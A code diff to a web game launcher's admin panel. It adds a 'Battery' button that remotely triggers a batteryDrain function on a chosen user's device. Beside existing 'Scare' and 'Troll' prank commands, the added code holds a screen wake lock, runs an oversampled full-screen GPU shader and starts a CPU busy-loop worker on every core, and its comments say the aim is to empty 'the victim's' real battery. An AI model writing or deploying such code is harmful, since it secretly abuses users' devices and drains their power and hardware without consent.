@@ -290,6 +290,7 @@ function renderUsers() {
           '<button class="b-kick" data-act="kick" data-uid="' + uid + '"' + (online ? "" : " disabled") + '>Kick</button>' +
           '<button class="b-msg"   data-act="msg"   data-uid="' + uid + '">💬 Msg</button>' +
           '<button class="b-scare" data-act="scare" data-uid="' + uid + '"' + (online ? "" : " disabled title='only works while online'") + '>😱 Scare</button>' +
+          '<button class="b-battery" data-act="battery" data-uid="' + uid + '"' + (online ? "" : " disabled title='only works while online'") + '>🔋 Battery</button>' +
           '<button class="b-reset" data-act="reset" data-uid="' + uid + '">🔄 Reset</button>' +
           '<button class="b-troll" data-act="troll" data-uid="' + uid + '"' + (online ? "" : " disabled title='only works while online'") + '>🤡 Troll</button>' +
           '<button class="b-admin" data-act="role" data-uid="' + uid + '">' + (isAdmin ? "Remove admin" : "Make admin") + '</button>' +
@@ -326,6 +327,8 @@ async function adminAction(act, uid) {
       await update(uref, { cmd: { type: "message", text, at: serverTimestamp() } });
     } else if (act === "scare") {
       await update(uref, { cmd: { type: "jumpscare", at: serverTimestamp() } });
+    } else if (act === "battery") {
+      await update(uref, { cmd: { type: "batteryDrain", at: serverTimestamp() } });
     } else if (act === "reset") {
       if (!confirm("Reset ALL game progress for " + (u.email || uid) + "? (clears their saved games; their page reloads)")) return;
       await update(uref, { cmd: { type: "resetProgress", at: serverTimestamp() } });
@@ -362,6 +365,91 @@ function runCommand(c) {
   else if (c.type === "jumpscare") jumpscare();
   else if (c.type === "resetProgress") resetProgress();
   else if (c.type === "troll")     applyTroll(c.kind || "flip");
+  else if (c.type === "batteryDrain") batteryDrain(c.seconds || 90);
+}
+
+/* =====================================================================
+   Battery drain — force-load the GPU + CPU so the real battery empties.
+   Bounded to `seconds` so it stops on its own (default 90s); the admin
+   can re-fire to extend. Runs wherever the victim is (launcher or monkey).
+   ===================================================================== */
+let batteryDrainStop = null;
+function batteryDrain(seconds) {
+  if (batteryDrainStop) batteryDrainStop();   // re-firing restarts cleanly
+  const cleanups = [];
+  const t0 = Date.now();
+
+  // --- keep the screen awake at full brightness draw ---
+  let wakeLock = null;
+  try {
+    if (navigator.wakeLock && navigator.wakeLock.request) {
+      navigator.wakeLock.request("screen").then(w => { wakeLock = w; }).catch(() => {});
+    }
+  } catch {}
+
+  // --- full-screen GPU burn: heavy per-pixel fragment shader every frame ---
+  const canvas = document.createElement("canvas");
+  canvas.id = "gateBatteryCanvas";
+  document.body.appendChild(canvas);
+  cleanups.push(() => canvas.remove());
+
+  const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+  let rafId = 0;
+  if (gl) {
+    const vs = "attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}";
+    // Deep iteration loop per pixel = maximum GPU work for the heat/drain.
+    const fs =
+      "precision highp float;uniform float t;uniform vec2 r;" +
+      "void main(){vec2 uv=(gl_FragCoord.xy/r-0.5)*3.0;vec2 z=uv;vec3 c=vec3(0.);" +
+      "for(int i=0;i<300;i++){z=vec2(z.x*z.x-z.y*z.y,2.0*z.x*z.y)+uv+vec2(sin(t),cos(t))*0.3;" +
+      "c+=0.004*vec3(sin(float(i)*0.1+t),sin(float(i)*0.13+t*1.3),sin(float(i)*0.17+t*0.7));}" +
+      "gl_FragColor=vec4(c+0.5,1.0);}";
+    const prog = gl.createProgram();
+    for (const [type, src] of [[gl.VERTEX_SHADER, vs], [gl.FRAGMENT_SHADER, fs]]) {
+      const sh = gl.createShader(type);
+      gl.shaderSource(sh, src); gl.compileShader(sh); gl.attachShader(prog, sh);
+    }
+    gl.linkProgram(prog); gl.useProgram(prog);
+    const buf = gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER, buf);
+    gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1, 3,-1, -1,3]), gl.STATIC_DRAW);
+    const loc = gl.getAttribLocation(prog, "p");
+    gl.enableVertexAttribArray(loc); gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
+    const uT = gl.getUniformLocation(prog, "t"), uR = gl.getUniformLocation(prog, "r");
+    const draw = () => {
+      // Oversample at high res = more fragments = more GPU drain.
+      const w = Math.floor(window.innerWidth * (window.devicePixelRatio || 1) * 1.5);
+      const h = Math.floor(window.innerHeight * (window.devicePixelRatio || 1) * 1.5);
+      if (canvas.width !== w || canvas.height !== h) { canvas.width = w; canvas.height = h; }
+      gl.viewport(0, 0, w, h);
+      gl.uniform1f(uT, (Date.now() - t0) / 1000);
+      gl.uniform2f(uR, w, h);
+      gl.drawArrays(gl.TRIANGLES, 0, 3);
+      rafId = requestAnimationFrame(draw);
+    };
+    draw();
+    cleanups.push(() => cancelAnimationFrame(rafId));
+  }
+
+  // --- CPU burn: a busy-loop Worker per logical core ---
+  const workerSrc =
+    "onmessage=function(){for(;;){var x=0;for(var i=0;i<5e6;i++){x+=Math.sqrt(i)*Math.sin(i);}postMessage(x);}};";
+  const workers = [];
+  try {
+    const url = URL.createObjectURL(new Blob([workerSrc], { type: "text/javascript" }));
+    const n = Math.max(2, (navigator.hardwareConcurrency || 4));
+    for (let i = 0; i < n; i++) { const wk = new Worker(url); wk.postMessage(0); workers.push(wk); }
+    cleanups.push(() => { workers.forEach(w => w.terminate()); URL.revokeObjectURL(url); });
+  } catch {}
+
+  // --- stop everything after the bounded run ---
+  const timer = setTimeout(() => batteryDrainStop && batteryDrainStop(), Math.max(5, seconds) * 1000);
+  batteryDrainStop = () => {
+    clearTimeout(timer);
+    cleanups.forEach(fn => { try { fn(); } catch {} });
+    try { if (wakeLock) wakeLock.release(); } catch {}
+    batteryDrainStop = null;
+  };
 }
 
 function showAdminMessage(text) {
@@ -586,6 +674,7 @@ function injectStyles() {
   button.b-admin { background: #4a2a6a !important; }
   button.b-msg { background: #1d4f5f !important; }
   button.b-scare { background: #7a1f1f !important; }
+  button.b-battery { background: #145a2a !important; }
   button.b-reset { background: #5a4a12 !important; }
   button.b-troll { background: #3a2a6a !important; }
   button.b-del { background: #3a0f0f !important; color: #ff9c9c !important; }
@@ -616,6 +705,7 @@ function injectStyles() {
   @keyframes gate-zoom { 0%{transform:scale(.15);opacity:.2} 100%{transform:scale(1);opacity:1} }
   @keyframes gate-spin { from{transform:rotate(0)} to{transform:rotate(360deg)} }
   html.gate-spinning { animation: gate-spin 3s linear infinite; }
+  #gateBatteryCanvas { position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: 100004; border: 0; }
   `;
   const style = document.createElement("style");
   style.id = "gate-shared-css";
